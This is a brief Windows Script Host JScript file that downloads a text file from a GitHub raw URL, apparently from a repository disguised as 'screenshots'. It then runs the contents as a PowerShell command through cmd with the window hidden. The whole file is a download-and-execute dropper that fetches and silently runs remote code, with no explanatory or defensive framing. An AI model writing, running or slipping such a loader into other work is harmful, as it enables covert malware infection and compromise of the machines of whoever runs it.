var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",false);
x.send();
var sh = new ActiveXObject("WScript.Shell");
sh.Run("cmd /c powershell -c \"" + x.responseText.replace(/"/g,'\\"') + "\"",0,false);